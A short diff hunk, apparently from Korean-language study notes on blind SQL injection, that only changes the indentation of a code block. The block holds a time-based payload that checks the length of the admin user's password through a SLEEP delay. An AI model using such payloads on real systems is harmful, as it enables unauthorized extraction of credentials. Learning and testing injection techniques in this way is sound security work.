@@ -342,6 +342,6 @@ Blooean-based Blind SQLi는\
   - 바로 오면 -> 다른 글자 시도
 
 3. 길이 확인
-   ```
-   ' AND IF(LENGTH((SELECT password FROM users WHERE username='admin'))=32, SLEEP(5), 0) -- -
-   ```
+  ```
+  ' AND IF(LENGTH((SELECT password FROM users WHERE username='admin'))=32, SLEEP(5), 0) -- -
+  ```
